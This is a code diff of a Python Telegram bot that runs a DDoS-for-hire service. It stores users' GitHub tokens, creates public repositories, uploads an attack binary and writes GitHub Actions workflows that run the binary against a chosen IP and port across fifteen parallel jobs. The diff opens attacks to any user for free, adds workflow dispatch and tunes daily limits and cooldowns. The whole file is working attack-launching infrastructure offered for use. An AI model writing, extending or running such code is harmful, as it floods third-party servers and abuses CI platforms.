@@ -477,24 +477,63 @@ def save_keys(keys_data):
     except Exception as e:
         logger.error(f"Error saving keys: {e}")
 
+def load_user_cooldowns():
+    try:
+        doc = db["user_cooldowns"].find_one({"_id": "user_cooldowns"})
+        if doc:
+            return doc.get("cooldowns", {})
+    except Exception as e:
+        logger.error(f"Error loading user cooldowns: {e}")
+    return {}
+
+def save_user_cooldowns(cooldowns):
+    try:
+        db["user_cooldowns"].update_one(
+            {"_id": "user_cooldowns"},
+            {"$set": {"cooldowns": cooldowns}},
+            upsert=True
+        )
+    except Exception as e:
+        logger.error(f"Error saving user cooldowns: {e}")
+
+user_attack_counts_date = ""
+
 def load_user_attack_counts():
     try:
-        doc = db["user_attack_counts"].find_one({"_id": "user_attack_counts"})
+        today_str = time.strftime("%Y-%m-%d")
+        doc = db["user_daily_attack_counts"].find_one({"_id": today_str})
         if doc:
-            return doc.get("dict", {})
+            return doc.get("counts", {})
     except Exception as e:
         logger.error(f"Error loading user attack counts: {e}")
     return {}
 
 def save_user_attack_counts(counts):
     try:
-        db["user_attack_counts"].update_one(
-            {"_id": "user_attack_counts"},
-            {"$set": {"dict": counts}},
+        today_str = time.strftime("%Y-%m-%d")
+        db["user_daily_attack_counts"].update_one(
+            {"_id": today_str},
+            {"$set": {"counts": counts}},
             upsert=True
         )
     except Exception as e:
         logger.error(f"Error saving user attack counts: {e}")
+
+def get_user_attack_count(user_id):
+    global user_attack_counts, user_attack_counts_date
+    today_str = time.strftime("%Y-%m-%d")
+    if user_attack_counts_date != today_str:
+        user_attack_counts = load_user_attack_counts()
+        user_attack_counts_date = today_str
+    return user_attack_counts.get(str(user_id), 0)
+
+def get_user_cooldown_remaining(user_id):
+    user_id_str = str(user_id)
+    current_time = time.time()
+    user_cd = user_cooldowns.get(user_id_str, 0)
+    if current_time < user_cd:
+        return int(user_cd - current_time)
+    return 0
 
 def track_user_activity(user_id):
     try:
@@ -539,12 +578,17 @@ groups = load_groups()
 resellers = load_resellers()
 github_tokens = load_github_tokens()
 MAINTENANCE_MODE = load_maintenance_mode()
-COOLDOWN_DURATION = load_cooldown()
-MAX_ATTACKS = load_max_attacks()
+COOLDOWN_DURATION = 300
+MAX_ATTACKS = 20
 MAX_ATTACK_DURATION = load_max_time()
-MAX_CONCURRENT_ATTACKS = load_max_concurrent_attacks()
+MAX_CONCURRENT_ATTACKS = 5
+save_cooldown(300)
+save_max_attacks(20)
+save_max_concurrent_attacks(5)
 blocked_ports = load_blocked_ports()
+user_cooldowns = load_user_cooldowns()
 user_attack_counts = load_user_attack_counts()
+user_attack_counts_date = time.strftime("%Y-%m-%d")
 keys_db = load_keys()
 force_join_db = load_force_join()
 
@@ -616,20 +660,20 @@ async def check_force_join(bot, user_id):
     return True, []
 
 def can_user_attack(user_id):
-    return (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)) and not MAINTENANCE_MODE
+    return not MAINTENANCE_MODE
 
 def can_start_attack(user_id):
-    global active_attacks, cooldown_until
+    global active_attacks, user_cooldowns, user_attack_counts
     
     if MAINTENANCE_MODE:
         return False, "⚠️ **ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ**\n━━━━━━━━━━━━━━━━━━━━━━\nʙᴏᴛ ɪs ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ."
     
     user_id_str = str(user_id)
-    current_count = user_attack_counts.get(user_id_str, 0)
+    current_count = get_user_attack_count(user_id)
     if current_count >= MAX_ATTACKS:
-        return False, f"⚠️ **ᴍᴀxɪᴍᴜᴍ ᴀᴛᴛᴀᴄᴋ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ**\n━━━━━━━━━━━━━━━━━━━━━━\nʏᴏᴜ ʜᴀᴠᴇ ᴜsᴇᴅ ᴀʟʟ {MAX_ATTACKS} ᴀᴛᴛᴀᴄᴋ(s). ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ ғᴏʀ ᴍᴏʀᴇ."
+        return False, f"⚠️ **ᴍᴀxɪᴍᴜᴍ ᴅᴀɪʟʏ ᴀᴛᴛᴀᴄᴋ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ**\n━━━━━━━━━━━━━━━━━━━━━━\nʏᴏᴜ ʜᴀᴠᴇ ᴜsᴇᴅ ᴀʟʟ `{MAX_ATTACKS}` ᴅᴀɪʟʏ ᴀᴛᴛᴀᴄᴋ(s). ᴘʟᴇᴀsᴇ ᴄᴏᴍᴇ ʙᴀᴄᴋ ᴛᴏᴍᴏʀʀᴏᴡ."
     
-    # Check concurrent attacks limit
+    # Check concurrent attacks limit (max 5)
     active_attacks = [a for a in active_attacks if time.time() < a.get("estimated_end_time", 0)]
     save_attack_state()
 
@@ -637,11 +681,11 @@ def can_start_attack(user_id):
         if not is_owner(user_id):
             return False, f"⚠️ **sᴇʀᴠᴇʀ BUSY: ᴍᴀx ᴄᴏɴᴄᴜʀʀᴇɴᴛ ᴀᴛᴛᴀᴄᴋs**\n━━━━━━━━━━━━━━━━━━━━━━\nCurrently {len(active_attacks)}/{MAX_CONCURRENT_ATTACKS} attacks running. Please wait for an attack slot to free up."
 
-    current_time = time.time()
-    if current_time < cooldown_until:
+    # Check per-user 300s cooldown
+    cd_rem = get_user_cooldown_remaining(user_id)
+    if cd_rem > 0:
         if not is_owner(user_id):
-            remaining_time = int(cooldown_until - current_time)
-            return False, f"⏳ **ᴄᴏᴏʟᴅᴏᴡɴ ʀᴇᴍᴀɪɴɪɴɢ**\n━━━━━━━━━━━━━━━━━━━━━━\nᴘʟᴇᴀsᴇ ᴡᴀɪᴛ `{remaining_time}` sᴇᴄᴏɴᴅs ʙᴇғᴏʀᴇ sᴛᴀʀᴛɪɴɢ ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ."
+            return False, f"⏳ **ᴄᴏᴏʟᴅᴏᴡɴ ʀᴇᴍᴀɪɴɪɴɢ**\n━━━━━━━━━━━━━━━━━━━━━━\nᴘʟᴇᴀsᴇ ᴡᴀɪᴛ `{cd_rem}` sᴇᴄᴏɴᴅs ʙᴇғᴏʀᴇ sᴛᴀʀᴛɪɴɢ ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ."
     
     return True, "✅ ʀᴇᴀᴅʏ ᴛᴏ sᴛᴀʀᴛ ᴀᴛᴛᴀᴄᴋ"
 
@@ -655,7 +699,7 @@ def is_valid_ip(ip):
     return not ip.startswith(('15', '96'))
 
 def start_attack(ip, port, time_val, user_id, method):
-    global active_attacks
+    global active_attacks, user_cooldowns, user_attack_counts
     attack_obj = {
         "ip": ip,
         "port": port,
@@ -669,37 +713,41 @@ def start_attack(ip, port, time_val, user_id, method):
     save_attack_state()
     
     user_id_str = str(user_id)
-    user_attack_counts[user_id_str] = user_attack_counts.get(user_id_str, 0) + 1
+    today_count = get_user_attack_count(user_id) + 1
+    user_attack_counts[user_id_str] = today_count
     save_user_attack_counts(user_attack_counts)
+    
+    # Set 300 seconds per-user cooldown
+    user_cooldowns[user_id_str] = time.time() + COOLDOWN_DURATION
+    save_user_cooldowns(user_cooldowns)
+    
     track_attack_activity()
     return attack_obj
 
 def finish_attack(attack_obj=None):
-    global active_attacks, cooldown_until
+    global active_attacks
     if attack_obj in active_attacks:
         active_attacks.remove(attack_obj)
     else:
         active_attacks = [a for a in active_attacks if time.time() < a.get("estimated_end_time", 0)]
-    cooldown_until = time.time() + COOLDOWN_DURATION
     save_attack_state()
 
 def stop_attack(user_id=None):
-    global active_attacks, cooldown_until
+    global active_attacks
     if user_id:
         active_attacks = [a for a in active_attacks if a.get("user_id") != user_id]
     else:
         active_attacks = []
-    cooldown_until = time.time() + COOLDOWN_DURATION
     save_attack_state()
 
-def get_attack_status():
-    global active_attacks, cooldown_until
+def get_attack_status(user_id=None):
+    global active_attacks, user_cooldowns
     current_time = time.time()
     active_attacks = [a for a in active_attacks if current_time < a.get("estimated_end_time", 0)]
     save_attack_state()
     
+    running_list = []
     if active_attacks:
-        running_list = []
         for att in active_attacks:
             elapsed = int(current_time - att['start_time'])
             remaining = max(0, int(att['estimated_end_time'] - current_time))
@@ -708,20 +756,15 @@ def get_attack_status():
                 "elapsed": elapsed,
                 "remaining": remaining
             })
-        return {
-            "status": "running",
-            "active_attacks": running_list,
-            "count": len(running_list)
-        }
     
-    if current_time < cooldown_until:
-        remaining_cooldown = int(cooldown_until - current_time)
-        return {
-            "status": "cooldown",
-            "remaining_cooldown": remaining_cooldown
-        }
+    cd_rem = get_user_cooldown_remaining(user_id) if user_id else 0
     
-    return {"status": "ready"}
+    return {
+        "status": "running" if running_list else ("cooldown" if cd_rem > 0 else "ready"),
+        "active_attacks": running_list,
+        "count": len(running_list),
+        "remaining_cooldown": cd_rem
+    }
 
 # Key Management Helper Functions
 def parse_duration(dur_str):
@@ -831,7 +874,7 @@ def create_repository(token, repo_name="flamedev-tg"):
                 repo_name,
                 description="VC DDOS Bot Repository",
                 private=False,
-                auto_init=False
+                auto_init=True
             )
             return repo, True
     except Exception as e:
@@ -839,7 +882,7 @@ def create_repository(token, repo_name="flamedev-tg"):
 
 def update_yml_file(token, repo_name, ip, port, time_val, method):
     yml_content = f"""name: flame Attack
-on: [push]
+on: [push, workflow_dispatch]
 
 jobs:
   flame:
@@ -856,22 +899,41 @@ jobs:
     try:
         g = Github(token)
         repo = g.get_repo(repo_name)
+        branch_name = getattr(repo, 'default_branch', 'main') or 'main'
         try:
-            file_content = repo.get_contents(YML_FILE_PATH)
+            file_content = repo.get_contents(YML_FILE_PATH, ref=branch_name)
             repo.update_file(
                 YML_FILE_PATH,
                 f"Update attack parameters - {ip}:{port} ({method})",
                 yml_content,
-                file_content.sha
+                file_content.sha,
+                branch=branch_name
             )
             logger.info(f"✅ Updated configuration for {repo_name}")
-        except:
-            repo.create_file(
-                YML_FILE_PATH,
-                f"Create attack parameters - {ip}:{port} ({method})",
-                yml_content
-            )
+        except Exception:
+            try:
+                repo.create_file(
+                    YML_FILE_PATH,
+                    f"Create attack parameters - {ip}:{port} ({method})",
+                    yml_content,
+                    branch=branch_name
+                )
+            except Exception:
+                repo.create_file(
+                    YML_FILE_PATH,
+                    f"Create attack parameters - {ip}:{port} ({method})",
+                    yml_content
+                )
             logger.info(f"✅ Created configuration for {repo_name}")
+            
+        try:
+            wf_filename = YML_FILE_PATH.split('/')[-1]
+            wf = repo.get_workflow(wf_filename)
+            wf.create_dispatch(branch_name)
+            logger.info(f"⚡ Dispatched workflow for {repo_name}")
+        except Exception as dispatch_err:
+            logger.warning(f"Workflow dispatch warning for {repo_name}: {dispatch_err}")
+            
         return True
     except Exception as e:
         logger.error(f"❌ Error for {repo_name}: {e}")
@@ -989,7 +1051,8 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "• <code>/broadcast &lt;msg&gt;</code> - Broadcast Message to Users\n"
             "• <code>/addtoken &lt;token&gt;</code> - Add Github Token\n"
             "• <code>/tokens</code> - List Github Server Tokens\n"
-            "• <code>/removetoken &lt;token&gt;</code> - Remove Github Token\n"
+            "• <code>/removetoken &lt;num/all&gt;</code> - Remove Specific Token or All\n"
+            "• <code>/cleartokens</code> - Remove All Tokens at Once\n"
             "• <code>/binary_upload</code> - Upload Attack Binary\n"
             "• <code>/addapk &lt;instructions&gt;</code> - Set Canary APK\n"
             "• <code>/setvideo</code> - Set Video Guide\n"
@@ -1310,7 +1373,7 @@ async def admin_callback_handler(update: Update, context: ContextTypes.DEFAULT_T
         )
     elif data == "admin_tokens_prompt":
         await query.edit_message_text(
-            "💻 **ɢɪᴛʜᴜʙ ᴛᴏᴋᴇɴs**\n━━━━━━━━━━━━━━━━━━━━━━\nManage tokens with:\n`/addtoken <token>`\n`/tokens`\n`/removetoken <token>`",
+            "💻 **ɢɪᴛʜᴜʙ ᴛᴏᴋᴇɴs**\n━━━━━━━━━━━━━━━━━━━━━━\nManage tokens with:\n`/addtoken <token>`\n`/tokens`\n`/removetoken <num>`\n`/cleartokens` (Remove All)",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel_back", style="primary")]])
         )
     elif data == "admin_apk_video_prompt":
@@ -1370,23 +1433,29 @@ async def admin_callback_handler(update: Update, context: ContextTypes.DEFAULT_T
 async def run_status_query(query, user_id):
     if not can_user_attack(user_id):
         await query.message.reply_text(
-            f"<tg-emoji emoji-id='5447644880824181073'>⚠️</tg-emoji> <b>ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ</b>",
+            f"<tg-emoji emoji-id='5447644880824181073'>⚠️</tg-emoji> <b>ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ</b>\n━━━━━━━━━━━━━━━━━━━━━━\nBot is under maintenance.",
             reply_markup=get_user_keyboard(),
             parse_mode="HTML"
         )
         return
     
-    attack_status = get_attack_status()
+    attack_status = get_attack_status(user_id=user_id)
     if attack_status["status"] == "running":
-        attack = attack_status["attack"]
-        message = (
-            f"<tg-emoji emoji-id='6311888443622299860'>✔️</tg-emoji> <b>ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ</b>\n"
-            "━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"<tg-emoji emoji-id='5447410659077661506'>🌐</tg-emoji> ᴛᴀʀɢᴇᴛ: <code>{attack['ip']}:{attack['port']}</code>\n"
-            f"<tg-emoji emoji-id='5375338737028841420'>🔄</tg-emoji> ᴇʟᴀᴘsᴇᴅ: <code>{attack_status['elapsed']}s</code>\n"
-            f"<tg-emoji emoji-id='6314480001118902592'>👁</tg-emoji> ʀᴇᴍᴀɪɴɪɴɢ: <code>{attack_status['remaining']}s</code>\n"
-            f"<tg-emoji emoji-id='5456140674028019486'>⚡️</tg-emoji> ᴍᴇᴛʜᴏᴅ: <code>{attack['method']}</code>"
-        )
+        running_items = attack_status["active_attacks"]
+        msg_lines = [
+            f"<tg-emoji emoji-id='6311888443622299860'>✔️</tg-emoji> <b>ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋs ({attack_status['count']}/{MAX_CONCURRENT_ATTACKS})</b>\n━━━━━━━━━━━━━━━━━━━━━━"
+        ]
+        for idx, item in enumerate(running_items, 1):
+            att = item["attack"]
+            msg_lines.append(
+                f"<b>Attack #{idx}</b>\n"
+                f"<tg-emoji emoji-id='5447410659077661506'>🌐</tg-emoji> ᴛᴀʀɢᴇᴛ: <code>{att['ip']}:{att['port']}</code>\n"
+                f"<tg-emoji emoji-id='5375338737028841420'>🔄</tg-emoji> ᴇʟᴀᴘsᴇᴅ: <code>{item['elapsed']}s</code> | <tg-emoji emoji-id='6314480001118902592'>⏱️</tg-emoji> ʀᴇᴍᴀɪɴɪɴɢ: <code>{item['remaining']}s</code>\n"
+                f"<tg-emoji emoji-id='5967507030842283316'>⚡</tg-emoji> ᴍᴇᴛʜᴏᴅ: <code>{att['method']}</code>"
+            )
+        if attack_status["remaining_cooldown"] > 0:
+            msg_lines.append(f"\n⏳ Your Cooldown Remaining: <code>{attack_status['remaining_cooldown']}s</code>")
+        message = "\n\n".join(msg_lines)
     elif attack_status["status"] == "cooldown":
         message = (
             f"<tg-emoji emoji-id='6314480001118902592'>👁</tg-emoji> <b>ᴄᴏᴏʟᴅᴏᴡɴ</b>\n"
@@ -1641,39 +1710,28 @@ async def myaccess_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         role = "💰 ʀᴇsᴇʟʟᴇʀ"
         reseller_data = resellers.get(str(user_id), {})
         expiry = reseller_data.get('expiry', 'LIFETIME')
-    elif is_approved_user(user_id):
-        role = "👤 ᴀᴘᴘʀᴏᴠᴇᴅ ᴜsᴇʀ"
-        user_data = approved_users.get(str(user_id), {})
-        expiry = user_data.get('expiry', '?')
-        if expiry != 'LIFETIME':
-            try:
-                expiry_time = float(expiry)
-                if time.time() > expiry_time:
-                    expiry = "ᴇxᴘɪʀᴇᴅ"
-                else:
-                    expiry = time.strftime("%Y-%m-%d %H:%M", time.localtime(expiry_time))
-            except:
-                pass
     else:
-        role = f"<tg-emoji emoji-id='5399850755337240950'>⏳</tg-emoji> ᴘᴇɴᴅɪɴɢ"
-        expiry = "ᴡᴀɪᴛɪɴɢ ғᴏʀ ᴀᴘᴘʀᴏᴠᴀʟ / ᴋᴇʏ"
+        role = "🌐 <b>ғʀᴇᴇ ᴜsᴇʀ (ᴜɴʟɪᴍɪᴛᴇᴅ)</b>"
+        expiry = "🔥 <b>ғʀᴇᴇ / ʟɪғᴇᴛɪᴍᴇ</b>"
     
-    user_id_str = str(user_id)
-    current_attacks = user_attack_counts.get(user_id_str, 0)
-    remaining_attacks = MAX_ATTACKS - current_attacks
-    
-    attack_access_label = f"<tg-emoji emoji-id='5206607081334906820'>✔️</tg-emoji> ʏᴇs" if can_user_attack(user_id) else f"<tg-emoji emoji-id='5210952531676504517'>😀</tg-emoji> ɴᴏ"
+    today_used = get_user_attack_count(user_id)
+    remaining_attacks = max(0, MAX_ATTACKS - today_used)
+    username = update.effective_user.username or "ɴᴏ ᴜsᴇʀɴᴀᴍᴇ"
+    cd_rem = get_user_cooldown_remaining(user_id)
+    cd_label = f"{cd_rem}s" if cd_rem > 0 else "0s (Ready)"
     
     await update.message.reply_text(
         f"<tg-emoji emoji-id='5296369303661067030'>🔒</tg-emoji> <b>ʏᴏᴜʀ ᴀᴄᴄᴇss ɪɴғᴏ</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n"
         f"• <b>ʀᴏʟᴇ:</b> {role}\n"
         f"• <b>ᴜsᴇʀ ɪᴅ:</b> <code>{user_id}</code>\n"
-        f"• <b>ᴜsᴇʀɴᴀᴍᴇ:</b> @{update.effective_user.username or 'ɴᴏ ᴜsᴇʀɴᴀᴍᴇ'}\n"
+        f"• <b>ᴜsᴇʀɴᴀᴍᴇ:</b> @{username}\n"
         f"• <b>ᴇxᴘɪʀʏ:</b> {expiry}\n"
-        f"• <b>ʀᴇᴍᴀɪɴɪɴɢ ᴀᴛᴛᴀᴄᴋs:</b> <code>{remaining_attacks}/{MAX_ATTACKS}</code>\n"
+        f"• <b>ᴅᴀɪʟʏ ᴀᴛᴛᴀᴄᴋs:</b> <code>{today_used}/{MAX_ATTACKS}</code> (Rem: {remaining_attacks})\n"
+        f"• <b>ᴄᴏᴏʟᴅᴏᴡɴ:</b> {cd_label}\n"
+        f"• <b>ᴍᴀx ᴄᴏɴᴄᴜʀʀᴇɴᴛ:</b> {MAX_CONCURRENT_ATTACKS}\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"<b>ᴀᴛᴛᴀᴄᴋ ᴀᴄᴄᴇss:</b> {attack_access_label}",
+        f"<b>ᴀᴛᴛᴀᴄᴋ ᴀᴄᴄᴇss:</b> <tg-emoji emoji-id='5206607081334906820'>✔️</tg-emoji> <b>ғʀᴇᴇ &amp; ᴜɴʟɪᴍɪᴛᴇᴅ</b>",
         reply_markup=get_user_keyboard(),
         parse_mode="HTML"
     )
@@ -1905,13 +1963,13 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if not can_user_attack(user_id):
         await update.message.reply_text(
-            f"<tg-emoji emoji-id='5447644880824181073'>⚠️</tg-emoji> <b>ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ</b>",
+            f"<tg-emoji emoji-id='5447644880824181073'>⚠️</tg-emoji> <b>ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ</b>\n━━━━━━━━━━━━━━━━━━━━━━\nBot is under maintenance.",
             reply_markup=get_user_keyboard(),
             parse_mode="HTML"
         )
         return
     
-    attack_status = get_attack_status()
+    attack_status = get_attack_status(user_id=user_id)
     if attack_status["status"] == "running":
         running_items = attack_status["active_attacks"]
         msg_lines = [
@@ -1925,10 +1983,12 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"<tg-emoji emoji-id='5375338737028841420'>🔄</tg-emoji> ᴇʟᴀᴘsᴇᴅ: <code>{item['elapsed']}s</code> | <tg-emoji emoji-id='6314480001118902592'>⏱️</tg-emoji> ʀᴇᴍᴀɪɴɪɴɢ: <code>{item['remaining']}s</code>\n"
                 f"<tg-emoji emoji-id='5967507030842283316'>⚡</tg-emoji> ᴍᴇᴛʜᴏᴅ: <code>{att['method']}</code>"
             )
+        if attack_status["remaining_cooldown"] > 0:
+            msg_lines.append(f"\n⏳ Your Cooldown Remaining: <code>{attack_status['remaining_cooldown']}s</code>")
         message = "\n\n".join(msg_lines)
     elif attack_status["status"] == "cooldown":
         message = (
-            f"<tg-emoji emoji-id='5258113901106580375'>⏱️</tg-emoji> <b>ᴄᴏᴏʟᴅᴏᴡɴ</b>\n"
+            f"<tg-emoji emoji-id='5258113901106580375'>⏱️</tg-emoji> <b>ʏᴏᴜʀ ᴄᴏᴏʟᴅᴏᴡɴ</b>\n"
             "━━━━━━━━━━━━━━━━━━━━━━\n"
             f"<tg-emoji emoji-id='5258113901106580375'>⏱️</tg-emoji> ʀᴇᴍᴀɪɴɪɴɢ: <code>{attack_status['remaining_cooldown']}s</code>\n"
             f"<tg-emoji emoji-id='5375338737028841420'>🔄</tg-emoji> ɴᴇxᴛ ᴀᴛᴛᴀᴄᴋ ɪɴ: <code>{attack_status['remaining_cooldown']}s</code>"
@@ -2737,26 +2797,50 @@ async def tokens_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = "🔑 **sᴇʀᴠᴇʀs ʟɪsᴛ:**\n━━━━━━━━━━━━━━━━━━━━━━\n"
     for i, t in enumerate(github_tokens, 1):
         text += f"{i}. 👤 `{t['username']}` | 📁 `{t['repo']}`\n"
-    await update.message.reply_text(text)
+    text += "\n💡 *Use `/cleartokens` or `/removetoken all` to remove all tokens.*"
+    await update.message.reply_text(text, parse_mode="Markdown")
+
+async def cleartokens_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not is_owner(user_id):
+        await update.message.reply_text("⚠️ **Only owners can clear tokens.**")
+        return
+    count = len(github_tokens)
+    if count == 0:
+        await update.message.reply_text("📭 No tokens to remove.")
+        return
+    github_tokens.clear()
+    save_github_tokens(github_tokens)
+    await update.message.reply_text(f"✅ All `{count}` GitHub tokens removed successfully.")
 
 async def removetoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if not is_owner(user_id):
         await update.message.reply_text("⚠️ **Only owners can remove tokens.**")
         return
-    if len(context.args) != 1:
-        await update.message.reply_text("Usage: `/removetoken <NUMBER>`")
+    if not context.args:
+        await update.message.reply_text("Usage: `/removetoken <NUMBER>` or `/removetoken all`", parse_mode="Markdown")
+        return
+    arg = context.args[0].strip().lower()
+    if arg in ["all", "clear", "reset"]:
+        count = len(github_tokens)
+        if count == 0:
+            await update.message.reply_text("📭 No tokens to remove.")
+            return
+        github_tokens.clear()
+        save_github_tokens(github_tokens)
+        await update.message.reply_text(f"✅ All `{count}` GitHub tokens removed successfully.")
         return
     try:
-        num = int(context.args[0])
+        num = int(arg)
         if num < 1 or num > len(github_tokens):
-            await update.message.reply_text("❌ Invalid number")
+            await update.message.reply_text("❌ Invalid server number.")
             return
         removed = github_tokens.pop(num - 1)
         save_github_tokens(github_tokens)
-        await update.message.reply_text(f"✅ Server `{removed['username']}` removed.")
+        await update.message.reply_text(f"✅ Server `{removed['username']}` removed. Remaining: {len(github_tokens)}")
     except ValueError:
-        await update.message.reply_text("❌ Invalid number")
+        await update.message.reply_text("❌ Invalid argument. Usage: `/removetoken <NUMBER>` or `/removetoken all`", parse_mode="Markdown")
 
 async def binary_upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -2785,7 +2869,7 @@ async def handle_binary_file(update: Update, context: ContextTypes.DEFAULT_TYPE)
         with open(file_path, 'rb') as f:
             binary_content = f.read()
         file_size = len(binary_content)
-        await progress_msg.edit_text(f"📊 Downloaded {file_size} bytes. Uploading to GitHub repos...")
+        await progress_msg.edit_text(f"📊 Downloaded {file_size} bytes. Uploading binary (`{BINARY_FILE_NAME}`) & triggering workflow on GitHub repos...", parse_mode="Markdown")
         
         success_count = 0
         fail_count = 0
@@ -2795,11 +2879,52 @@ async def handle_binary_file(update: Update, context: ContextTypes.DEFAULT_TYPE)
             try:
                 g = Github(token_data['token'])
                 repo = g.get_repo(token_data['repo'])
+                branch_name = getattr(repo, 'default_branch', 'main') or 'main'
+                
+                # 1. Save binary file as BINARY_FILE_NAME ("neo")
                 try:
-                    existing = repo.get_contents(BINARY_FILE_NAME)
-                    repo.update_file(BINARY_FILE_NAME, "Update binary", binary_content, existing.sha, branch="main")
+                    existing = repo.get_contents(BINARY_FILE_NAME, ref=branch_name)
+                    repo.update_file(BINARY_FILE_NAME, f"Update binary {BINARY_FILE_NAME}", binary_content, existing.sha, branch=branch_name)
                 except Exception:
-                    repo.create_file(BINARY_FILE_NAME, "Upload binary", binary_content, branch="main")
+                    try:
+                        repo.create_file(BINARY_FILE_NAME, f"Upload binary {BINARY_FILE_NAME}", binary_content, branch=branch_name)
+                    except Exception:
+                        repo.create_file(BINARY_FILE_NAME, f"Upload binary {BINARY_FILE_NAME}", binary_content)
+
+                # 2. Ensure workflow file .github/workflows/main.yml exists
+                default_yml_content = f"""name: flame Attack
+on: [push, workflow_dispatch]
+
+jobs:
+  flame:
+    runs-on: ubuntu-22.04
+    strategy:
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10,
+            11,12,13,14,15]
+    steps:
+    - uses: actions/checkout@v3
+    - run: chmod +x {BINARY_FILE_NAME}
+    - run: sudo ./{BINARY_FILE_NAME} 1.1.1.1 80 1 999
+"""
+                try:
+                    existing_yml = repo.get_contents(YML_FILE_PATH, ref=branch_name)
+                    repo.update_file(YML_FILE_PATH, f"Update workflow for {BINARY_FILE_NAME}", default_yml_content, existing_yml.sha, branch=branch_name)
+                except Exception:
+                    try:
+                        repo.create_file(YML_FILE_PATH, f"Create workflow for {BINARY_FILE_NAME}", default_yml_content, branch=branch_name)
+                    except Exception:
+                        repo.create_file(YML_FILE_PATH, f"Create workflow for {BINARY_FILE_NAME}", default_yml_content)
+
+                # 3. Trigger / Dispatch workflow
+                try:
+                    wf_filename = YML_FILE_PATH.split('/')[-1]
+                    wf = repo.get_workflow(wf_filename)
+                    wf.create_dispatch(branch_name)
+                    logger.info(f"⚡ Workflow triggered/dispatched for {token_data['repo']}")
+                except Exception as dispatch_err:
+                    logger.warning(f"Workflow dispatch warning for {token_data['repo']}: {dispatch_err}")
+
                 results.append((token_data['username'], True, "OK"))
             except Exception as ex:
                 logger.error(f"Error uploading binary to {token_data.get('repo')}: {ex}")
@@ -2818,7 +2943,6 @@ async def handle_binary_file(update: Update, context: ContextTypes.DEFAULT_TYPE)
                 success_count += 1
             else:
                 fail_count += 1
-                # Escape HTML special characters in username and err_msg
                 safe_user = username.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                 safe_err = str(err_msg).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                 fail_details.append(f"• <b>{safe_user}</b>: <code>{safe_err}</code>")
@@ -2827,7 +2951,7 @@ async def handle_binary_file(update: Update, context: ContextTypes.DEFAULT_TYPE)
             os.remove(file_path)
             
         res_text = (
-            f"<tg-emoji emoji-id='5208748315805499400'>✅</tg-emoji> <b>ʙɪɴᴀʀʏ ᴜᴘʟᴏᴀᴅ ғɪɴɪsʜᴇᴅ!</b>\n"
+            f"<tg-emoji emoji-id='5208748315805499400'>✅</tg-emoji> <b>ʙɪɴᴀʀʏ ({BINARY_FILE_NAME}) &amp; ᴡᴏʀᴋғʟᴏᴡ ᴛʀɪɢɢᴇʀᴇᴅ!</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━\n"
             f"• <b>sᴜᴄᴄᴇss:</b> <code>{success_count}</code>\n"
             f"• <b>ғᴀɪʟᴇᴅ:</b> <code>{fail_count}</code>"
@@ -3131,6 +3255,8 @@ def main():
     application.add_handler(CommandHandler("addtoken", addtoken_command))
     application.add_handler(CommandHandler("tokens", tokens_command))
     application.add_handler(CommandHandler("removetoken", removetoken_command))
+    application.add_handler(CommandHandler("cleartokens", cleartokens_command))
+    application.add_handler(CommandHandler("removealltokens", cleartokens_command))
     application.add_handler(CommandHandler("removexpiredtoken", removexpiredtoken_command))
     
     # Text Handler for Bottom Menu Buttons
